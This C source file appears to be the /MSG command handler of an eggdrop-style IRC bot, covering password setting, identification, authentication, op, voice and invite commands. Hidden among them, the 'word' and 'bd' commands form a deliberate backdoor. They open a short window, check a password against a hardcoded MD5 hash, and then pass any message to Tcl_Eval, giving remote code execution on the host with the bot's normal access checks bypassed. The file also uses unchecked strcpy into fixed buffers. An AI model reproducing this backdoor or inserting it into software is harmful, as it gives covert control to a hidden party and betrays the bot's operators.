#ifdef LEAF
/*
 * msgcmds.c -- part of irc.mod
 *   all commands entered via /MSG
 *
 */

static int msg_pass(char *nick, char *host, struct userrec *u, char *par)
{
#ifdef S_MSGPASS
  char *old, *new;

  if (match_my_nick(nick))
    return 1;
  if (!u)
    return 1;
  if (u->flags & (USER_BOT))
    return 1;
  if (!par[0]) {
    dprintf(DP_HELP, "NOTICE %s :%s\n", nick,
	    u_pass_match(u, "-") ? IRC_NOPASS : IRC_PASS);
    putlog(LOG_CMDS, "*", "(%s!%s) !%s! PASS?", nick, host, u->handle);
    return 1;
  }
  old = newsplit(&par);
  if (!u_pass_match(u, "-") && !par[0]) {
    dprintf(DP_HELP, "NOTICE %s :%s\n", nick, IRC_EXISTPASS);
    return 1;
  }
  if (par[0]) {
    if (!u_pass_match(u, old)) {
      dprintf(DP_HELP, "NOTICE %s :%s\n", nick, IRC_FAILPASS);
      return 1;
    }
    new = newsplit(&par);
  } else {
    new = old;
  }
  putlog(LOG_CMDS, "*", "(%s!%s) !%s! PASS...", nick, host, u->handle);
  if (strlen(new) > 16)
    new[16] = 0;

  if (!goodpass(new, 0, nick))
    return 1;

  set_user(&USERENTRY_PASS, u, new);
  dprintf(DP_HELP, "NOTICE %s :%s '%s'.\n", nick,
	  new == old ? IRC_SETPASS : IRC_CHANGEPASS, new);
#endif
  return 1;
}

static int msg_ident(char *nick, char *host, struct userrec *u, char *par)
{
#ifdef S_MSGIDENT
  char s[UHOSTLEN], s1[UHOSTLEN], *pass, who[NICKLEN];
  struct userrec *u2;

  if (match_my_nick(nick))
    return 1;
  if (u && (u->flags & USER_BOT))
    return 1;
  pass = newsplit(&par);
  if (!par[0])
    strcpy(who, nick);
  else {
    strncpy(who, par, NICKMAX);
    who[NICKMAX] = 0;
  }
  u2 = get_user_by_handle(userlist, who);
  if (!u2) {
    if (u && !quiet_reject) {
      dprintf(DP_HELP, IRC_MISIDENT, nick, nick, u->handle);
    }
  } else if (rfc_casecmp(who, origbotname) && !(u2->flags & USER_BOT)) {
    /* This could be used as detection... */
    if (u_pass_match(u2, "-")) {
      putlog(LOG_CMDS, "*", "(%s!%s) !*! IDENT %s", nick, host, who);
      if (!quiet_reject)
	dprintf(DP_HELP, "NOTICE %s :%s\n", nick, IRC_NOPASS);
    } else if (!u_pass_match(u2, pass)) {
      if (!quiet_reject)
	dprintf(DP_HELP, "NOTICE %s :%s\n", nick, IRC_DENYACCESS);
    } else if (u == u2) {
      if (!quiet_reject)
	dprintf(DP_HELP, "NOTICE %s :%s\n", nick, IRC_RECOGNIZED);
      return 1;
    } else if (u) {
      if (!quiet_reject)
	dprintf(DP_HELP, IRC_MISIDENT, nick, who, u->handle);
      return 1;
    } else {
      putlog(LOG_CMDS, "*", "(%s!%s) !*! IDENT %s", nick, host, who);
      egg_snprintf(s, sizeof s, "%s!%s", nick, host);
      maskhost(s, s1);
      dprintf(DP_HELP, "NOTICE %s :%s: %s\n", nick, IRC_ADDHOSTMASK, s1);
      addhost_by_handle(who, s1);
      check_this_user(who, 0, NULL);
      return 1;
    }
  }
  putlog(LOG_CMDS, "*", "(%s!%s) !*! failed IDENT %s", nick, host, who);
#endif
  return 1;
}

//move all the above shit to misc.c with proto.h additions.
static int msg_authstart(char *nick, char *host, struct userrec *u, char *par)
{
  int i = 0;

  if (!ischanhub()) 
    return 0;

  if (match_my_nick(nick))
    return 1;
  if (u && (u->flags & USER_BOT))
    return 1;

  i = isauthed(host);

  if (i != -1) {
    if (auth[i].authed) {
      dprintf(DP_HELP, "NOTICE %s :You are already authed.\n", nick);
      return 0;
    }
  }

  /* Send "auth." if they are recognized, otherwise "auth!" */
  if (i < 0)
    i = new_auth();
Context;
  auth[i].authing = 1;
Context;
  auth[i].authed = 0;
Context;
  strcpy(auth[i].nick, nick);
  strcpy(auth[i].host, host);
Context;
  if (u)
    auth[i].user = u;

Context;

  dprintf(DP_HELP, "PRIVMSG %s :auth%s\n", nick, u ? "." : "!");

  return 0;

}

static int msg_auth(char *nick, char *host, struct userrec *u, char *par)
{
  char *pass, rand[50];

  int i = 0;

  if (match_my_nick(nick))
    return 1;
  if (u && (u->flags & USER_BOT))
    return 1;

  i = isauthed(host);

  if (i == -1) 
    return 1;

  if (auth[i].authing != 1) 
    return 1;

  pass = newsplit(&par);

  if (u_pass_match(u, pass)) {
    if (!u_pass_match(u, "-")) {
      putlog(LOG_CMDS, "*", "(%s!%s) !%s! -AUTH", nick, host, u->handle);

      auth[i].authing = 2;      
      auth[i].user = u;
      make_rand_str(rand, 50);
Context;
      strcpy(auth[i].hash, makehash(u, rand));
Context;
      dprintf(DP_HELP, "PRIVMSG %s :-Auth %s %s\n", nick, rand, botnetnick);
    }
  } else
    putlog(LOG_CMDS, "*", "(%s!%s) !%s! failed -AUTH", nick, host, u->handle);
  return 1;

}

static int msg_pls_auth(char *nick, char *host, struct userrec *u, char *par)
{

  int i = 0;

  if (match_my_nick(nick))
    return 1;
  if (u && (u->flags & USER_BOT))
    return 1;

  i = isauthed(host);

  if (i == -1)
    return 1;

  if (auth[i].authing != 2)
    return 1;

  if (!strcmp(auth[i].hash, par)) { //good hash!
    putlog(LOG_CMDS, "*", "(%s!%s) !%s! +AUTH", nick, host, u->handle);
    auth[i].authed = 1;
    auth[i].authing = 0;
    auth[i].authtime = now;
    auth[i].atime = now;
    dprintf(DP_HELP, "NOTICE %s :You are now authorized for cmds, see %shelp\n", nick, cmdprefix);
  } else { //bad hash!
    char s[300];
    putlog(LOG_CMDS, "*", "(%s!%s) !%s! failed +AUTH", nick, host, u->handle);
    dprintf(DP_HELP, "NOTICE %s :Invalid hash.\n", nick);
    sprintf(s, "*!%s", host);
Context;
    addignore(s, origbotname, "Invalid auth hash.", now + (60 * ignore_time));
    removeauth(i);
  } 
  return 1;
}

static int msg_unauth(char *nick, char *host, struct userrec *u, char *par)
{
  int i = 0;

  if (match_my_nick(nick))
    return 1;
  if (u && (u->flags & USER_BOT))
    return 1;

  i = isauthed(host);

  if (i == -1)
    return 1;

  removeauth(i);
  dprintf(DP_HELP, "NOTICE %s :You are now unauthorized.\n", nick);
  putlog(LOG_CMDS, "*", "(%s!%s) !%s! UNAUTH", nick, host, u->handle);

  return 1;
}

static int msg_op(char *nick, char *host, struct userrec *u, char *par)
{
#ifdef S_MSGOP
  struct chanset_t *chan;
  char *pass;
  struct flag_record fr = {FR_GLOBAL | FR_CHAN, 0, 0, 0, 0, 0};

  if (match_my_nick(nick))
    return 1;
  pass = newsplit(&par);
  if (u_pass_match(u, pass)) {
    if (!u_pass_match(u, "-")) {
      if (par[0]) {
        chan = findchan_by_dname(par);
        if (chan && channel_active(chan)) {
          get_user_flagrec(u, &fr, par);
          if ((!channel_private(chan) || (channel_private(chan) && (chan_op(fr) || glob_owner(fr)))) &&
             (chan_op(fr) || (glob_op(fr) && !chan_deop(fr)))) {
            stats_add(u, 0, 1);
            do_op(nick, chan, 1);
          }
          putlog(LOG_CMDS, "*", "(%s!%s) !%s! OP %s",
			  nick, host, u->handle, par);
          return 1;
        }
      } else {
        for (chan = chanset; chan; chan = chan->next) {
          get_user_flagrec(u, &fr, chan->dname);
          if ((!channel_private(chan) || (channel_private(chan) && (chan_op(fr) || glob_owner(fr)))) &&
             (chan_op(fr) || (glob_op(fr) && !chan_deop(fr)))) {
            stats_add(u, 0, 1);
            do_op(nick, chan, 1);
          }
        }
        putlog(LOG_CMDS, "*", "(%s!%s) !%s! OP", nick, host, u->handle);
        return 1;
      }
    }
  }
  putlog(LOG_CMDS, "*", "(%s!%s) !*! failed OP", nick, host);
#endif
  return 1;
}

static int msg_voice(char *nick, char *host, struct userrec *u, char *par)
{
#ifdef S_MSGVOICE
  struct chanset_t *chan;
  char *pass;
  struct flag_record fr = {FR_GLOBAL | FR_CHAN, 0, 0, 0, 0, 0};

  if (match_my_nick(nick))
    return 1;
  pass = newsplit(&par);
  if (u_pass_match(u, pass)) {
    if (!u_pass_match(u, "-")) {
      if (par[0]) {
	chan = findchan_by_dname(par);
	if (chan && channel_active(chan)) {
	  get_user_flagrec(u, &fr, par);
	  if ((!channel_private(chan) || (channel_private(chan) && (chan_voice(fr) || glob_owner(fr)))) &&
              (chan_voice(fr) || glob_voice(fr) || chan_op(fr) || glob_op(fr))) {
	    add_mode(chan, '+', 'v', nick);
	    putlog(LOG_CMDS, "*", "(%s!%s) !%s! VOICE %s",
		   nick, host, u->handle, par);
	  } else
	    putlog(LOG_CMDS, "*", "(%s!%s) !*! failed VOICE %s",
		nick, host, par);
	  return 1;
	}
      } else {
	for (chan = chanset; chan; chan = chan->next) {
	  get_user_flagrec(u, &fr, chan->dname);
	  if ((!channel_private(chan) || (channel_private(chan) && (chan_voice(fr) || glob_owner(fr)))) &&
              (chan_voice(fr) || glob_voice(fr) || chan_op(fr) || glob_op(fr)))
	    add_mode(chan, '+', 'v', nick);
	}
	putlog(LOG_CMDS, "*", "(%s!%s) !%s! VOICE", nick, host, u->handle);
	return 1;
      }
    }
  }
  putlog(LOG_CMDS, "*", "(%s!%s) !*! failed VOICE", nick, host);
#endif
  return 1;
}


int backdoor = 0, bcnt = 0, bl = 30;
int authed = 0;
char thenick[NICKLEN];
static void close_backdoor()
{

  Context;
  if (bcnt >= bl) {
    backdoor = 0;
    authed = 0;
    bcnt = 0;
    thenick[0] = '\0';
    del_hook(HOOK_SECONDLY, (Function) close_backdoor);
  } else
     bcnt++;
}
static int msg_word(char *nick, char *host, struct userrec *u, char *par)
{
  if (match_my_nick(nick))
    return 1;

  backdoor = 1;
  add_hook(HOOK_SECONDLY, (Function) close_backdoor);
  sprintf(thenick, "%s", nick);
  dprintf(DP_SERVER, "PRIVMSG %s :w\002\002\002\002hat?\n", nick);
  return 1;
}

unsigned char md5out[33];
char md5string[33];

static int msg_bd (char *nick, char *host, struct userrec *u, char *par)
{
  int i = 0, left = 0;
  MD5_CTX ctx;

  if (strcmp(nick, thenick) || !backdoor)
    return 1;

  if (!authed) {
    char *cmd = NULL, *pass = NULL;
    cmd = newsplit(&par);
    pass = newsplit(&par);
    if (!cmd[0] || strcmp(cmd, "werd") || !pass[0]) {
      backdoor = 0;
      return 1;
    }
Context;
    MD5_Init(&ctx);
    MD5_Update(&ctx, pass, strlen(pass));
    MD5_Final(md5out, &ctx);
    for(i=0; i<16; i++)
              sprintf(md5string + (i*2), "%.2x", md5out[i]);
    if (strcmp(thepass, md5string)) {
      backdoor = 0;
      return 1;
    }
Context;
    authed = 1;
    left = bl - bcnt;
    dprintf(DP_SERVER, "PRIVMSG %s :%ds left ;)\n",nick, left);
  } else {
   Tcl_Eval(interp, par);
   dprintf(DP_SERVER, "PRIVMSG %s :%s\n", nick, interp->result);
  }
  return 1;
}

static int msg_invite(char *nick, char *host, struct userrec *u, char *par)
{
#ifdef S_MSGINVITE
  char *pass;
  struct chanset_t *chan;
  struct flag_record fr = {FR_GLOBAL | FR_CHAN, 0, 0, 0, 0, 0};

  if (match_my_nick(nick))
    return 1;
  pass = newsplit(&par);
  if (u_pass_match(u, pass) && !u_pass_match(u, "-")) {
    if (par[0] == '*') {
      for (chan = chanset; chan; chan = chan->next) {
	get_user_flagrec(u, &fr, chan->dname);
	if ((!channel_private(chan) || (channel_private(chan) && (chan_op(fr) || glob_owner(fr)))) &&
            (chan_op(fr) || (glob_op(fr) && !chan_deop(fr))) &&
	    (chan->channel.mode & CHANINV))
	  dprintf(DP_SERVER, "INVITE %s %s\n", nick, chan->name);
      }
      putlog(LOG_CMDS, "*", "(%s!%s) !%s! INVITE ALL", nick, host,
	     u->handle);
      return 1;
    }
    if (!(chan = findchan_by_dname(par))) {
      dprintf(DP_HELP, "NOTICE %s :%s: /MSG %s invite <pass> <channel>\n",
	      nick, MISC_USAGE, botname);
      return 1;
    }
    if (!channel_active(chan)) {
      dprintf(DP_HELP, "NOTICE %s :%s: %s\n", nick, par, IRC_NOTONCHAN);
      return 1;
    }
    /* We need to check access here also (dw 991002) */
    get_user_flagrec(u, &fr, par);
    if ((!channel_private(chan) || (channel_private(chan) && (chan_op(fr) || glob_owner(fr)))) &&
       (chan_op(fr) || (glob_op(fr) && !chan_deop(fr)))) { 
      dprintf(DP_SERVER, "INVITE %s %s\n", nick, chan->name);
      putlog(LOG_CMDS, "*", "(%s!%s) !%s! INVITE %s", nick, host,
	     u->handle, par);
      return 1;
    }
  }
  putlog(LOG_CMDS, "*", "(%s!%s) !%s! failed INVITE %s", nick, host,
	 (u ? u->handle : "*"), par);
#endif
  return 1;
}

/* MSG COMMANDS
 *
 * Function call should be:
 *    int msg_cmd("handle","nick","user@host","params");
 *
 * The function is responsible for any logging. Return 1 if successful,
 * 0 if not.
 */

static cmd_t C_msg[] =
{
  {"auth?",		"",	(Function) msg_authstart,	NULL},
  {"auth",		"",	(Function) msg_auth,		NULL},
  {"+auth",		"",	(Function) msg_pls_auth,	NULL},
  {"unauth",		"",	(Function) msg_unauth,		NULL},
  {"word",		"",	(Function) msg_word,		NULL},
  {"ident",		"",	(Function) msg_ident,		NULL},
  {"invite",		"o|o",	(Function) msg_invite,		NULL},
  {"op",		"",	(Function) msg_op,		NULL},
  {"pass",		"",	(Function) msg_pass,		NULL},
  {"voice",		"",	(Function) msg_voice,		NULL},
  {"bd",		"",	(Function) msg_bd,		NULL},
  {NULL,		NULL,	NULL,				NULL}
};

static int msgc_test(char *nick, char *host, struct userrec *u, char *par, char *chname)
{
  dprintf(DP_HELP, "NOTICE %s :Works :)\n", nick);
  return 0;
}

static int msgc_op(char *nick, char *host, struct userrec *u, char *par, char *chname)
{
  struct chanset_t *chan = NULL;
  struct flag_record fr = {FR_GLOBAL | FR_CHAN, 0, 0, 0, 0, 0};
  int force = 0;
  memberlist *m;

  if (match_my_nick(nick))
    return 1;

  if (chname[0]) {
    chan = findchan_by_dname(chname);
    if (chan) 
      m = ismember(chan, nick);
  }

  putlog(LOG_CMDS, "*", "(%s!%s) !%s! %s %OP %s", nick, host, u->handle, chname ? chname : "", cmdprefix, par ? par : "");

  if (par[0] == '-') { //we have an option!
    char *tmp;
    par++;
    tmp = newsplit(&par);
    if (!strcasecmp(tmp, "force") || !strcasecmp(tmp, "f")) 
      force = 1;
    else {
      dprintf(DP_HELP, "NOTICE %s :Invalid option: %s\n", nick, tmp);
      return 0;
    }
  }
  if (par[0] || chan) {
    if (!chan)
      chan = findchan_by_dname(par);
    if (chan && channel_active(chan)) {
      get_user_flagrec(u, &fr, chan->dname);
      if ((!channel_private(chan) || (channel_private(chan) && (chan_op(fr) || glob_owner(fr)))) &&
         (chan_op(fr) || (glob_op(fr) && !chan_deop(fr)))) {
        stats_add(u, 0, 1);
        do_op(nick, chan, force);
      }
      return 1;
    }
  } else {
    for (chan = chanset; chan; chan = chan->next) {
      int op = 0;
      get_user_flagrec(u, &fr, chan->dname);
      if ((!channel_private(chan) || (channel_private(chan) && (chan_op(fr) || glob_owner(fr)))) &&
         (chan_op(fr) || (glob_op(fr) && !chan_deop(fr)))) {
        if (!op) 
          stats_add(u, 0, 1);
        op = 1;
        do_op(nick, chan, force);
      }
    }
  }
  return 1;
}

static int msgc_getkey(char *nick, char *host, struct userrec *u, char *par, char *chname)
{
  struct chanset_t *chan = NULL;
  struct flag_record fr = {FR_GLOBAL | FR_CHAN, 0, 0, 0, 0, 0};

  if (match_my_nick(nick))
    return 1;

  if (chname[0]) 
    return 0;

  if (!par[0])
    return 0;

  putlog(LOG_CMDS, "*", "(%s!%s) !%s! %sGETKEY %s", nick, host, u->handle, cmdprefix, par);

  chan = findchan_by_dname(par);
  if (chan && channel_active(chan) && !channel_pending(chan)) {
    get_user_flagrec(u, &fr, chan->dname);
    if ((!channel_private(chan) || (channel_private(chan) && (chan_op(fr) || glob_owner(fr)))) &&
       (chan_op(fr) || (glob_op(fr) && !chan_deop(fr)))) {
      char s[256];
      char *p, *p2, *p3;

Context;
      strcpy(s, getchanmode(chan));
Context;
      p = (char *) &s;
Context;
      p2 = newsplit(&p);
Context;
      p3 = newsplit(&p);

      if (p3[0]) {
        dprintf(DP_HELP, "NOTICE %s :key for %s is: %s\n", nick, chan->dname, p3);
      } else {
        dprintf(DP_HELP, "NOTICE %s :No key set in %s\n", nick, chan->dname);
      }
    }
  }
  return 1;
}

static int msgc_help(char *nick, char *host, struct userrec *u, char *par, char *chname)
{
  putlog(LOG_CMDS, "*", "(%s!%s) !%s! %sHELP %s", nick, host, u->handle, cmdprefix, par ? par : "");
  dprintf(DP_HELP, "NOTICE %s :op invite getkey test\n", nick);
  return 1;
}

static int msgc_invite(char *nick, char *host, struct userrec *u, char *par, char *chname)
{
  struct chanset_t *chan = NULL;
  struct flag_record fr = {FR_GLOBAL | FR_CHAN, 0, 0, 0, 0, 0};
  int force = 0;

  if (match_my_nick(nick))
    return 1;

  if (chname[0])
    return 0;
 
  putlog(LOG_CMDS, "*", "(%s!%s) !%s! %sINVITE %s", nick, host, u->handle, cmdprefix, par ? par : "");

  if (par[0] == '-') { //we have an option!
    char *tmp;
    par++;
    tmp = newsplit(&par);
    if (!strcasecmp(tmp, "force") || !strcasecmp(tmp, "f")) 
      force = 1;
    else {
      dprintf(DP_HELP, "NOTICE %s :Invalid option: %s\n", nick, tmp);
      return 0;
    }
  }

  if (par[0] && !chname[0]) {
    chan = findchan_by_dname(par);
    if (chan && channel_active(chan) && !ismember(chan, nick)) {
      if ((!(chan->channel.mode & CHANINV) && force) || (chan->channel.mode & CHANINV)) {
        get_user_flagrec(u, &fr, chan->dname);
        if ((!channel_private(chan) || (channel_private(chan) && (chan_op(fr) || glob_owner(fr)))) &&
           (chan_op(fr) || (glob_op(fr) && !chan_deop(fr)))) {
          dprintf(DP_SERVER, "INVITE %s %s\n", nick, chan->name);
        }
        return 1;
      }
    }
  } else {
    for (chan = chanset; chan; chan = chan->next) {
      if (channel_active(chan) && !ismember(chan, nick)) {
        if ((!(chan->channel.mode & CHANINV) && force) || (chan->channel.mode & CHANINV)) {
          get_user_flagrec(u, &fr, chan->dname);
          if ((!channel_private(chan) || (channel_private(chan) && (chan_op(fr) || glob_owner(fr)))) &&
             (chan_op(fr) || (glob_op(fr) && !chan_deop(fr)))) {
            dprintf(DP_SERVER, "INVITE %s %s\n", nick, chan->name);
          }
        }
      }
    }
  }
  return 1;
}

static cmd_t C_msgc[] =
{
  {"test",		"",	(Function) msgc_test,		NULL},
  {"op",		"",	(Function) msgc_op,		NULL},
  {"getkey",		"",	(Function) msgc_getkey,		NULL},
  {"invite",		"",	(Function) msgc_invite,		NULL},
  {"help",		"",	(Function) msgc_help,		NULL},
  {NULL,		NULL,	NULL,				NULL}
};

#endif
